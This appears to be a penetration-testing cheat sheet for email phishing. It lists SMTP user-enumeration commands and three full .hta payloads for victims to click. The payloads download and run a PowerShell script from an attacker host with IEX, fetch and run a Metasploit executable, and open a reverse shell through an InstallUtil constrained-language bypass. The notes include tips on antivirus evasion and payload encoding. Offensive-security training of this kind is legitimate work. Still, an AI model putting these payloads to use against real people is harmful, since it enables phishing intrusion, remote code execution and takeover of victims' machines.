## Phishing through Email

First of all, you need to find a valid email account to send the phish to. This could either be through enumeration of the web portals or if SMTP is open, using the following enum command
```bash
# Can check via manual telnet to see which method is allowed
$ smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
$ smtp-user-enum -M EXPN -u admin1 -t 10.0.0.1
$ smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
$ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
```

### Payload - Via .hta

- Only works if victim is using IE and hence mshta.exe will execute the .hta payload
- Lets prepare a .hta payload which we can serve as a link in our email's body to entice the victim to click and execute
- Payload from simple to complex
- We call the below evil.hta

**Simple Powershell Download Cradle and RevShell via TCPSocket**
- Can evade AV because of the use of "non-standard" var names
```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var r = shell.Run("powershell.exe (New-Object System.Net.WebClient).DownloadString('http://<ip>/run.txt')| IEX);
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```
run.txt here > ![]()

For run.txt, you can also Base64 Encode it but if you are using cyberchef, remember to Encode Text (UTF-16 LE) recipe before Base64 encode recipe!
![alt text](image.png)

**Simple Powershell Download EXE and Execute**
- No AMSI and Applocker bypass so will likely download the EXE but fail to execute

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var r = shell.Run("powershell.exe iwr -uri http://<ip>/msf.exe -outfile C:\\users\\public\\msf.exe; C:\\users\\public\\msf.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```

**PSBypassCLM Rev Shell**
- Requires InstalUtil. Bypasses CLM for that session

```html
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var r = shell.Run("powershell.exe iwr -uri http://<ip>/psbypassclm.exe -outfile C:\\users\\public\\bypass.exe; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=<kali ip> /rport=443 /U c:\\Users\\Public\\bypass.exe");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```



### Sending the email!

